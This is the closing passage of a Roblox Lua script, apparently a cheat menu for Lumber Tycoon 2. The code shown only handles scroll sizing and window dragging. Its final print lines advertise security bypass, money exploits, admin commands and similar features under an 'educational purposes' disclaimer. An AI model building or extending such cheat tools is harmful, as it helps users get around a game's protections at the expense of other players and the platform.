    local contentSize = ContentLayout.AbsoluteContentSize
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, contentSize.Y + 20)
end

ContentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(UpdateScrollFrame)

-- Dragging functionality for main frame
local dragging = false
local dragStart = nil
local startPos = nil

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

MainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

print("LT2 Enhanced Exploit Menu loaded successfully!")
print("Features include: Security bypass, Player modifications, Money exploits, Teleportation, Tool spawning, Wood manipulation, Base management, and Admin commands")
print("Use at your own risk - this is for educational purposes only!")